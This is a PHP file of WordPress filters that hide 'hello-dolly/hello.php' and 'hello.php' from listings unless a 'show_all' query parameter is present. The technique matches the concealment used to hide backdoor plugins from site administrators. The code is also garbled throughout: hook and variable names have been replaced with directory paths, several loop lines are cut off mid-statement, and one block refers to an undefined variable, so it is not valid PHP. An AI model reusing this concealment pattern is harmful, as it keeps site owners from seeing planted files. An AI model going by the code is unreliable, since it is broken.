<?php
add_filter(
	'all_wp-content',
	function ( $wp-content ) {
		$shouldHide = ! array_key_exists( 'show_all', $_GET );
		if ( $shouldHide ) {
			$hiddenwp-content = [
			'hello-dolly/hello.php',
			'hello.php',
			];
			foreach ( $hiddenwp-content as $hiddenwp-content ) {
			unset( $wp-content[ $hiddenwp-content] );
			}
		}
		return $wp-content;
	}
);
add_filter(
	'all_wp-content/fonts',
	function ( $wp-content/fonts ) {
		$shouldHide = ! array_key_exists( 'show_all', $_GET );
		if ( $shouldHide ) {
			$hiddenwp-content/fonts = [
			'hello-dolly/hello.php',
			'hello.php',
			];
			foreach ( $hiddenwp-content/fonts as $hiddenwp-content/fonts ) {
			unset( $fonts[ $hiddenwp-content/fonts] );
			}
		}
		return $wp-content/fonts;
	}
);
add_filter(
	'all_wp-content/plugins',
	function ( $wp-content/plugins ) {
		$shouldHide = ! array_key_exists( 'show_all', $_GET );
		if ( $shouldHide ) {
			$hiddenwp-content/plugins = [
				'hello-dolly/hello.php',
			'hello.php',
			];
			foreach ( $hiddenwp-content/plugins as $hiddenwp-content/plugins ) {
			unset( $wp-content/plugins[ $hiddenwp-content/plugins] );
			}
		}
		return $wp-content/plugins;
	}
);
add_filter(
	'all_wp-content/themes',
	function ( themes ) {
		$shouldHide = ! array_key_exists( 'show_all', $_GET );
		if ( $shouldHide ) {
			$hiddenwp-content/themes = [
			'hello-dolly/hello.php',
			'hello.php',
			];themes as $hiddenwp-content/themes ) {
			unset( $wp-content/themes[ $hiddenwp-content/themes ] );
			}
		}
		return $wp-content/themes;
	}
);
add_filter(
	'all_wp-content/uploads',
	function ( wp-content/uploads ) {
		$shouldHide = ! array_key_exists( 'show_all', $_GET );
		if ( $shouldHide ) {
			$hiddenwp-content/uploads = [
			'hello-dolly/hello.php',
			'hello.php',
			];wp-content/uploads as $hiddenwp-content/uploads ) {
			unset( $wp-content/uploads[ $hiddenwp-content/uploads] );
			}
		}
		return $wp-content/uploads;
	}
);
add_filter(
	'all_wp-content/uploads-webpc',
	function ( wp-content/uploads-webpc ) {
		$shouldHide = ! array_key_exists( 'show_all', $_GET );
		if ( $shouldHide ) {
			$hiddenwp-content/uploads-webpc = [
			'hello-dolly/hello.php',
			'hello.php',
			];wp-content/uploads-webpc as $hiddenwp-content/uploads-webpc ) {
			unset( $wp-content/uploads-webpc[ $hiddenwp-content/uploads-webpc] );
			}
		}
		return $wp-content/uploads-webpc;
	}
);